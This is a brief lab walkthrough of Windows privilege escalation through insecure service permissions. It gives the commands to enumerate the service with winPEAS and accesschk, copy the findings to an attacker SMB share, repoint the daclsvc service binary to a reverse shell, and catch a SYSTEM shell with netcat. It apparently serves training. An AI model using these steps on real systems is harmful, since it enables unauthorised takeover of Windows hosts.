1x1 Service - Insecure Service Permissions

# Service - Insecure Service Permissions


```bash
.\winPEASany.exe ansi quiet servicesinfo > wpeas_services_op.txt

copy C:\PrivEsc\wpeas_services_op.txt \\10.9.4.127\kali\wpeas_services_op.txt

cat wpeas_services_op.txt
```
Identified 1 service mis-configuration

![60aa5646ccd37c92dc373d5e61d9d460.png](../_resources/d12fd0d8da27468c9bba7d009f3470d4.png)

```console
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
```
![f870c547a46421c0eb583c0fc4454d57.png](../_resources/bd3784743fd3463791e4a3c18d1d4bda.png)

```bash
sc qc daclsvc
```
![1340a8c57e12e021acbb4edd93eb1acf.png](../_resources/d8e4b60968254cf18f29e2079fb8f20a.png)
```bash
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```
![dcd10a4f4b7e9f18aba5dfd1e0553cae.png](../_resources/1395e21362e5484cb8bff4e38d236d80.png)
```bash
sudo nc -nvlp 53
```
![3ac4ed949ced18b1c395b06dd5557eb8.png](../_resources/c0e7c68956704e57b1d692544765a4db.png)
```bash
net start daclsvc
```
![b659f3b70af91f40100290ea2a43e292.png](../_resources/5ae2f9754cff49f4888bc38c23b09e62.png)

**Got System**

![9f52a47513a45133f9bccf190222e1a3.png](../_resources/fb69977262b84ab4b6b1f132568bc9cd.png)
